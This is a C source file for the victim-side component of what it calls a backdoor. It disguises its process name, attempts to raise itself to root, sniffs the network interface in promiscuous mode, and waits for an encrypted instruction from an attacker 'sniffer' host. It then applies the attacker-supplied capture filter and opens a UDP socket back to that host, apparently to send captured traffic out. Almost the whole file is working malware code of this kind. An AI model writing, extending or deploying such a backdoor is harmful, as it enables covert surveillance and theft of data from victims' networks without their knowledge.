#include "target.h"
#include "extern.h"

struct options_target opts;
struct sockaddr_in serv_addr;

pcap_t* nic_fd;

int main(int argc, char *argv[]) {
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    struct bpf_program fp;      // holds compiled program
    bpf_u_int32 maskp;          // subnet mask
    bpf_u_int32 netp;           // ip
    char* nic_device;
    u_char* args = NULL;
    pthread_t thread_id;

    puts("[ Backdoor victim initialized ]");
    options_target_init(opts);

    program_setup(argc, argv);              /* set process name, get root privilege */
    nic_device = pcap_lookupdev(errbuf);    /* get interface */

    /* get the IP address and subnet mask of the device */
    pcap_lookupnet(nic_device, &netp, &maskp, errbuf);

    /* open the device for packet capture & set the device in promiscuous mode */
    nic_fd = pcap_open_live(nic_device, BUFSIZ, 1, -1, errbuf);
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    /* This Thread will track the status of instruction received or not */
    pthread_create(&thread_id, NULL, track_opts_target_flag, NULL);

    /* Start the capture session */
    pcap_loop(nic_fd, (int) opts.count, pkt_callback, args);
    pthread_join(thread_id, NULL);  // back to main thread

    /* Creating socket file descriptor */
    if ((opts.target_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    /* Filling server information */
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(DEFAULT_PORT);
    serv_addr.sin_addr.s_addr = inet_addr(opts.sniffer_ip);

    printf("Got instruction: [ %s ] from %s\n", opts.decrypt_instruction, opts.sniffer_ip);
    puts("Will start applied filter sniffing in");
    for (int i = 5; i > 0; i--) {
        printf("%d\n", i);
        sleep(1);
    }

    if (pcap_compile (nic_fd, &fp, opts.decrypt_instruction, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter (nic_fd, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }

    // Restart the capture session
    opts.pcap2_flag = TRUE;
    pcap_loop(nic_fd, (int) opts.count, pkt_callback2, args);

    return EXIT_SUCCESS;
}


void options_target_init() {
    memset(&opts, 0, sizeof(struct options_target));
    opts.count = DEFAULT_COUNT;
    opts.target_flag = FALSE;
}


void program_setup(int argc, char *argv[]) {
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], MASK);
    prctl(PR_SET_NAME, MASK, 0, 0);

    /* change the UID/GID to 0 (raise privilege) */
    setuid(0);
    setgid(0);
}


void *track_opts_target_flag(void *vargp) {
    while(1) {
        if (opts.target_flag == TRUE) {
            pcap_breakloop(nic_fd);
            break;
        }
    }
}
